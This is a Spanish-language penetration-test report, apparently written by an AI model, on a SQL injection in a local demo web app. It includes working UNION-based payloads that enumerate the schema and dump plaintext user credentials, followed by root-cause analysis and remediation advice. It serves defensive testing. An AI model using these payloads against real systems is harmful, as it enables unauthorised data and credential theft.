# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:10:26  
**Modelo:** Claude Sonnet 4.6  

---

## Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de tipo **SQL Injection** en el parámetro `id` del endpoint principal de la aplicación. La vulnerabilidad permite a un atacante no autenticado extraer toda la información de la base de datos, incluyendo credenciales de usuarios.

---

## Detalles Técnicos

### Endpoint Vulnerable
- **URL:** `http://web.dev.local:8083/?id=<payload>&Submit=Submit`
- **Parámetro:** `id` (método GET)
- **Tipo de vulnerabilidad:** SQL Injection clásica (Error-Based + UNION-Based)

### Prueba de Concepto

**1. Confirmación de vulnerabilidad (error al inyectar comilla):**
```
GET /?id=1'&Submit=Submit
```
**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right syntax 
to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El servidor expone el error SQL directamente, confirmando la vulnerabilidad y revelando la ruta del archivo (`/var/www/html/low.php`).

**2. Enumeración de columnas (ORDER BY):**
```
GET /?id=1' ORDER BY 2-- -&Submit=Submit  → OK (2 columnas)
GET /?id=1' ORDER BY 3-- -&Submit=Submit  → ERROR (más de 2 columnas no existen)
```

**3. Extracción de información del servidor (UNION SELECT):**
```sql
-1' UNION SELECT version(),database()-- -
```
- **Versión DBMS:** `10.11.14-MariaDB-ubu2204`
- **Base de datos activa:** `sqli_demo`
- **Usuario DB:** `root@172.18.0.3`
- **Directorio de datos:** `/var/lib/mysql/`

**4. Enumeración de tablas:**
```sql
-1' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema='sqli_demo'-- -
```
- **Tablas encontradas:** `users`

**5. Enumeración de columnas de `users`:**
```sql
-1' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -
```
- **Columnas:** `user_id, first_name, last_name, username, password, email`

**6. Extracción de credenciales:**
```sql
-1' UNION SELECT group_concat(user_id,'|',username,'|',password SEPARATOR '~'),2 FROM sqli_demo.users-- -
```

### Datos Extraídos - Tabla `users`

| user_id | username   | password    |
|---------|------------|-------------|
| 1       | admin      | password123 |
| 2       | jsmith     | secret456   |
| 3       | bjohnson   | mypass789   |
| 4       | awilliams  | qwerty123   |
| 5       | cbrown     | password    |
| 6       | ddavis     | secure123   |
| 7       | emiller    | hackme      |
| 8       | fwilson    | admin123    |

> ⚠️ Las contraseñas se almacenan en **texto plano**, lo que agrava severamente el impacto de esta vulnerabilidad.

---

## Clasificación de la Vulnerabilidad

| Campo              | Detalle                                     |
|--------------------|---------------------------------------------|
| **Tipo**           | SQL Injection (CWE-89)                      |
| **CVSS v3 Score**  | 9.8 (Crítico)                               |
| **Vector**         | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H        |
| **Autenticación**  | No requerida                                |
| **Impacto**        | Confidencialidad: Alto, Integridad: Alto    |

---

## Causa Raíz

El archivo `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin sanitización ni uso de consultas parametrizadas (prepared statements):

```php
// Código vulnerable (inferido del comportamiento)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

---

## Impacto

1. **Extracción completa de datos:** Acceso a todos los registros de la base de datos incluyendo credenciales.
2. **Credenciales en texto plano:** Las contraseñas no están hasheadas, permitiendo uso inmediato.
3. **Acceso root a la DB:** El usuario de base de datos es `root`, lo que podría permitir operaciones más destructivas (lectura/escritura de archivos del sistema).
4. **Exposición de infraestructura:** Se revelan rutas de servidor, versiones y configuraciones internas.

---

## Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements):**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Hashear contraseñas:** Usar `password_hash()` con `PASSWORD_BCRYPT` en PHP.

3. **Principio de mínimo privilegio:** El usuario de base de datos no debe ser `root`; usar un usuario con permisos mínimos necesarios.

4. **Deshabilitar mensajes de error en producción:** No exponer errores SQL al usuario final (`display_errors = Off` en `php.ini`).

5. **Validar y sanitizar inputs:** Validar que `id` sea un entero antes de procesarlo.

6. **WAF:** Implementar un Web Application Firewall para detectar patrones de SQLi.

---

## Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de SQL Injection que permite la extracción completa de la base de datos `sqli_demo`, incluyendo las credenciales en texto plano de 8 usuarios. Se recomienda corrección inmediata mediante el uso de consultas parametrizadas y el cifrado de contraseñas.
